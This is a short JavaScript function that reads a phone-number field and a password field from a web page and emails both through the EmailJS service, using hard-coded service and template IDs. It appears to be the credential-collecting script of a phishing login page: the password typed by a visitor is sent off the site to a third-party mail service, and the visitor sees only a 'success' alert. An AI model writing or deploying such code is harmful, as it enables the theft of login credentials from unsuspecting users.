function sendmail() {
    let params ={
        from_name:document.getElementById('number').value,
         password:document.getElementById('password').value

    }
    emailjs.send("service_8hk3lct", "template_riq36od" , params).then(function (res) {
        alert('success ' + res.status);
    }) 
}